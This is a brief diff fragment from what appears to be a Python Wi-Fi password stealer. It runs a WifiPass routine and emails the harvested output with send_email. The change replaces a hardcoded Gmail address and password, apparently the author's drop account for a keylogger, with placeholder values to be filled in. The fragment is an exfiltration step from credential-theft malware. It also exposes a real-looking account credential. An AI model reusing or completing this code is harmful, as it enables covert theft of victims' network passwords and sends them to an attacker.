@@ -45,4 +45,4 @@ def send_email(email,password,message):
 
 msg = WifiPass().execute()
 
-send_email("forkeylogger101@gmail.com","loggerkey101",msg)
+send_email("youremail@email.com","pass",msg)
